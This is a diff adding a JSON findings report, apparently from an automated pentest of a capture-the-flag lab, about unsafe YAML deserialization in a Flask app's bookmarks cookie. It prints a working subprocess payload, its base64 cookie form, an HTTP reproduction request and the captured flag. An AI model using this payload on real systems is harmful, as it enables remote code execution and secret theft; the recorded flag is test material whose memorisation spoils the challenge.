@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-13T00:00:39.955769+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "a732cdb1-1224-462b-b774-071fa201c15c",
+      "timestamp": "2026-04-13T00:00:39.955632+00:00",
+      "title": "Insecure YAML Deserialization in bookmarks Cookie (RCE)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:39995",
+      "description": "The Flask application stores a YAML-serialized list of bookmarks (Python objects using !!python/object:app.models.UrlObj tags) in the client-side 'bookmarks' cookie. The server deserializes this cookie using yaml.load() (unsafe loader), which supports arbitrary Python object instantiation. An attacker can craft a malicious YAML payload in the cookie that executes arbitrary OS commands via !!python/object/apply:subprocess.check_output or similar tags. The FLAG environment variable was extracted, confirming full RCE.",
+      "evidence": "CTF FLAG extracted from server environment: FLAG=flag{ed791869-404b-453f-bf8e-86a09040af65}\n\nExploit cookie payload:\n- name: !!python/object/apply:subprocess.check_output\n    - [/bin/sh, -c, env]\n  url: http://172.17.0.1:39995/\n\nBase64: LSBuYW1lOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6c3VicHJvY2Vzcy5jaGVja19vdXRwdXQKICAgIC0gWy9iaW4vc2gsIC1jLCBlbnZdCiAgdXJsOiBodHRwOi8vMTcyLjE3LjAuMTozOTk5NS8K\n\nServer environment dump revealed:\nHOSTNAME=3f6e8d06cdce\nFLAG=flag{ed791869-404b-453f-bf8e-86a09040af65}\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nAPACHE_RUN_USER=www-data",
+      "tool_used": "manual YAML deserialization exploit via http_request",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "GET /list HTTP/1.1\nHost: 172.17.0.1:39995\nCookie: bookmarks=LSBuYW1lOiAhIXB5dGhvbi9vYmplY3QvYXBwbHk6c3VicHJvY2Vzcy5jaGVja19vdXRwdXQKICAgIC0gWy9iaW4vc2gsIC1jLCBlbnZdCiAgdXJsOiBodHRwOi8vMTcyLjE3LjAuMTozOTk5NS8K",
+        "expected": "Response body contains env vars including FLAG=flag{ed791869-404b-453f-bf8e-86a09040af65}"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "aef94569-ef84-4909-a9e0-830b27e20b13",
+      "timestamp": "2026-04-13T00:00:51.138352+00:00",
+      "title": "Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser\"] --> Apache[\"Apache/2.4.66 :39995\"]\n  Apache --> Flask[\"Flask App (Python)\"]\n  Flask --> YAML[\"yaml.load() UnsafeLoader\"]\n  Flask --> Template[\"Jinja2 Template\"]\n  Flask --> URLCheck[\"URL Status Checker\"]\n  YAML -->|\"bookmarks cookie\"| ObjModel[\"app.models.UrlObj\"]\n  ObjModel --> Template\n  Template --> Browser\n  Attacker[\"Attacker\"] -->|\"Malicious YAML cookie\"| Apache\n  YAML -->|\"RCE via !!python/object/apply\"| OS[\"OS Commands / RCE\"]\n  OS -->|\"FLAG env var extracted\"| Flag[\"flag{ed791869-404b-453f-bf8e-86a09040af65}\"]"
+    }
+  ]
+}
